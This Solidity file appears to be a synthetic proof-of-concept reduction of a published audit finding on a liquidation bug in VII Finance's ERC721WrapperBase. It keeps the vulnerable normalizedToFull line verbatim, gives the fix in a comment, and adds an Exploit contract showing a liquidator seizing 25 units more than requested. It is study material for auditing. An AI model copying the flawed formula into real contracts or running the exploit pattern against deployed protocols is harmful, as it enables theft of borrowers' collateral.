// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    VII Finance — More value extracted by liquidations than expected
    (Cyfrin 2025-07-15 vii-v2.0; finding #61329, Giovanni Di Siena)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.

    Root cause: ERC721WrapperBase.normalizedToFull multiplies by
    totalSupply(tokenId) instead of the sender's actual ERC-6909 balance of
    that tokenId. When the violator owns <100% of a tokenId (e.g. after a
    partial transfer / partial liquidation), a value-denominated transfer
    seizes MORE unit-of-account value than requested.

    Vulnerable line preserved verbatim below (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal mulDiv matching OZ Math.mulDiv (floor).
library Math {
    function mulDiv(uint256 x, uint256 y, uint256 denominator) internal pure returns (uint256 result) {
        require(denominator > 0, "div0");
        unchecked {
            result = (x * y) / denominator;
        }
    }
}

/// @notice Reduced ERC721WrapperBase: multi-tokenId ERC-6909 collateral wrapper.
///         Each tokenId has unit-of-account value equal to ERC-6909 balance (1:1).
///         balanceOf(user) = sum of their ERC-6909 balances across enabled tokenIds.
contract ERC721WrapperBase {
    mapping(uint256 => uint256) public totalSupplyOf; // ERC-6909 total per tokenId
    mapping(address => mapping(uint256 => uint256)) public balanceOfToken; // user => tokenId => amount
    mapping(address => uint256[]) internal _enabledTokenIds;

    function totalSupply(uint256 tokenId) public view returns (uint256) {
        return totalSupplyOf[tokenId];
    }

    function balanceOf(address account) public view returns (uint256 total) {
        uint256 n = _enabledTokenIds[account].length;
        for (uint256 i = 0; i < n; ++i) {
            uint256 tokenId = _enabledTokenIds[account][i];
            total += balanceOfToken[account][tokenId];
        }
    }

    function balanceOf(address account, uint256 tokenId) public view returns (uint256) {
        return balanceOfToken[account][tokenId];
    }

    function totalTokenIdsEnabledBy(address account) public view returns (uint256) {
        return _enabledTokenIds[account].length;
    }

    function tokenIdOfOwnerByIndex(address account, uint256 index) public view returns (uint256) {
        return _enabledTokenIds[account][index];
    }

    function enableTokenIdAsCollateral(uint256 tokenId) external {
        address sender = msg.sender;
        uint256 n = _enabledTokenIds[sender].length;
        for (uint256 i = 0; i < n; ++i) {
            if (_enabledTokenIds[sender][i] == tokenId) return;
        }
        _enabledTokenIds[sender].push(tokenId);
    }

    /// @dev Seed a wrapped position: mint full ERC-6909 supply to `to`.
    function seedWrap(uint256 tokenId, address to, uint256 supply) external {
        require(totalSupplyOf[tokenId] == 0, "already");
        totalSupplyOf[tokenId] = supply;
        balanceOfToken[to][tokenId] = supply;
    }

    /// @dev Partial ERC-6909 transfer of a single tokenId (set up <100% ownership).
    function transferTokenId(address to, uint256 tokenId, uint256 amount) external {
        address sender = msg.sender;
        require(balanceOfToken[sender][tokenId] >= amount, "bal");
        balanceOfToken[sender][tokenId] -= amount;
        balanceOfToken[to][tokenId] += amount;
    }

    /// @notice Verbatim core of ERC721WrapperBase::transfer (value-denominated).
    /// @dev Transfers a proportional amount of ERC6909 tokens for each enabled
    ///      tokenId from the sender to the receiver.
    function transfer(address to, uint256 amount) external returns (bool) {
        address sender = msg.sender;
        uint256 currentBalance = balanceOf(sender);

        uint256 totalTokenIds = totalTokenIdsEnabledBy(sender);

        for (uint256 i = 0; i < totalTokenIds; ++i) {
            uint256 tokenId = tokenIdOfOwnerByIndex(sender, i);
            //this concludes the liquidation. The liquidator can come back to do whatever they want with the ERC6909 tokens
            _transfer(sender, to, tokenId, normalizedToFull(tokenId, amount, currentBalance));
        }
        return true;
    }

    function _transfer(address from, address to, uint256 tokenId, uint256 amount) internal {
        require(balanceOfToken[from][tokenId] >= amount, "ERC6909InsufficientBalance");
        balanceOfToken[from][tokenId] -= amount;
        balanceOfToken[to][tokenId] += amount;
    }

    /// @notice THE BUG: multiplies by totalSupply(tokenId) instead of the sender's
    ///         actual ERC-6909 balance of that tokenId.
    function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance)
        public
        view
        returns (uint256)
    {
        // @audit => multiplying by the total ERC-6909 supply of the specified tokenId is incorrect
        return Math.mulDiv(amount, totalSupply(tokenId), currentBalance); // @> VULN: uses totalSupply instead of sender's tokenId balance
        // FIX: return Math.mulDiv(amount, balanceOf(msg.sender, tokenId), currentBalance);
    }
}

/// @dev Marker ERC20 so the Playground profit chip can read extracted surplus value.
contract ValueToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

/// @notice Orchestrator: sets up partial ownership, liquidates via transfer(),
///         and asserts the liquidator receives MORE value than requested.
contract Exploit {
    ERC721WrapperBase public wrapper; // CREATE nonce 1
    ValueToken public valueToken; // CREATE nonce 2

    uint256 public constant TOKEN_ID_1 = 1;
    uint256 public constant TOKEN_ID_2 = 2;
    uint256 public constant SUPPLY = 100;

    // Surfaces for the forge driver / playground
    uint256 public requestedAmount;
    uint256 public liquidatorValue;
    uint256 public surplus;

    address public constant BORROWER2 = address(0xB0B2);
    address public constant LIQUIDATOR = address(0xA11CE);

    constructor() {
        wrapper = new ERC721WrapperBase();
        valueToken = new ValueToken();
    }

    function run() external {
        address borrower2 = BORROWER2;
        address liquidator = LIQUIDATOR;

        // 1. Borrower wraps two positions (full supply each)
        wrapper.seedWrap(TOKEN_ID_1, address(this), SUPPLY);
        wrapper.seedWrap(TOKEN_ID_2, address(this), SUPPLY);
        wrapper.enableTokenIdAsCollateral(TOKEN_ID_1);
        wrapper.enableTokenIdAsCollateral(TOKEN_ID_2);

        // 2. Borrower transfers half of tokenId1 → no longer owns 100% of both
        //    After: tokenId1 bal=50 (value 50), tokenId2 bal=100 (value 100)
        //    total balanceOf(borrower) = 150
        wrapper.transferTokenId(borrower2, TOKEN_ID_1, SUPPLY / 2);

        uint256 beforeBal = wrapper.balanceOf(address(this));
        require(beforeBal == 150, "setup bal");

        // 3. Liquidator requests half of remaining value (75)
        requestedAmount = beforeBal / 2; // 75
        wrapper.transfer(liquidator, requestedAmount);

        // 4. Liquidator enables collaterals so balanceOf sums their received shares
        //    (balanceOf only counts enabled tokenIds — call as liquidator via helper)
        //    We compute value from raw ERC-6909 balances instead.
        uint256 liqT1 = wrapper.balanceOf(liquidator, TOKEN_ID_1);
        uint256 liqT2 = wrapper.balanceOf(liquidator, TOKEN_ID_2);
        liquidatorValue = liqT1 + liqT2;

        // With the bug:
        //   tokenId1: mulDiv(75, totalSupply=100, 150) = 50  (all remaining)
        //   tokenId2: mulDiv(75, totalSupply=100, 150) = 50
        //   total value seized = 100  >  requested 75
        // Correct formula would use sender balances 50 and 100 → 25 + 50 = 75.
        require(liquidatorValue > requestedAmount, "harm: liquidator should get more than requested");
        surplus = liquidatorValue - requestedAmount;
        require(surplus == 25, "expected surplus of 25");

        // Mint surplus to liquidator as ValueToken so Playground profit chip reads it
        valueToken.mint(liquidator, surplus);
        require(valueToken.balanceOf(liquidator) == 25, "profit token");
    }
}
